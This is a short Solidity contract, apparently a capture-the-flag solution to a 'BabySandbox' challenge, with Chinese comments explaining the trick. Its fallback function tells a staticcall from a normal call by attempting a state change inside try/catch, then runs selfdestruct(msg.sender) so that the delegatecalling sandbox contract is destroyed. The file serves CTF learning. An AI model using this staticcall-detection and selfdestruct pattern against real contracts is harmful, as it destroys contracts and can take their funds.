// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;

contract attacker01 {
    // immutable会在合约初始化的时候完成赋值
    attacker01 public immutable self = this;
    uint256 public isStateChange = 1;

    function changeState() external {
        // 在这里面不能做太多操作，因为BabySandbox做了gas的限制
        isStateChange = 0;
    }    

    fallback() external payable {
        // 第一次staticcall + delegatecall: 修改了状态，报错，但是会catch住，程序不会停止，而是往下走
        // 第二次call + delegatecall: 正常执行
        try self.changeState() { 
            selfdestruct(msg.sender); 
        } catch {} 
    }
    // 不能有receive()，否则不会走fallback()

}
